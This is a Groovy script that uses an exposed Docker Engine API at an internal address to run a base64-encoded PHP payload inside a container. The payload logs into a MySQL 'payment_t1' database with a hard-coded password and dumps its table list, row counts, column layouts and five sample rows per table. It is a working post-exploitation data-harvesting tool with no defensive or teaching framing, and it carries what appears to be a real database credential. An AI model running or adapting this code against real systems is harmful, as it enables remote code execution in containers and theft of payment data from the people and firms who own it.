import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
$c=new mysqli("172.27.141.6","app_t1","wUt22Us2CUh#+M=","payment_t1",3310);
if($c->connect_error){die("FAIL:".$c->connect_error);}

echo "=== SHOW TABLES payment_t1 ===\n";
$r=$c->query("SHOW TABLES FROM payment_t1");
$tables=[];
while($row=$r->fetch_row()){echo $row[0]."\n";$tables[]=$row[0];}

echo "\n=== TABLE COUNTS + DESCRIBE ===\n";
foreach($tables as $t){
    $cr=$c->query("SELECT COUNT(*) as cnt FROM $t");
    $cnt=$cr?$cr->fetch_row()[0]:0;
    echo "\n--- $t ($cnt rows) ---\n";
    $dr=$c->query("DESCRIBE $t");
    if($dr){while($col=$dr->fetch_row()){echo "$col[0]|$col[1]\n";}}
}

echo "\n=== SAMPLE 5 per table ===\n";
foreach($tables as $t){
    $sr=$c->query("SELECT * FROM $t LIMIT 5");
    if($sr && $sr->num_rows>0){
        $flds=$sr->fetch_fields();$h=[];foreach($flds as $f)$h[]=$f->name;
        echo "\n--- $t ---\n";
        echo implode("|",$h)."\n";
        while($row=$sr->fetch_row()){
            $clean=[];
            foreach($row as $v){
                $s=$v===null?"NULL":substr(preg_replace('/[\r\n\t|]/',' ',(string)$v),0,100);
                $clean[]=$s;
            }
            echo implode("|",$clean)."\n";
        }
    }
}

$c->close();
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(30000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/t1tables.php && php /tmp/t1tables.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(60000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
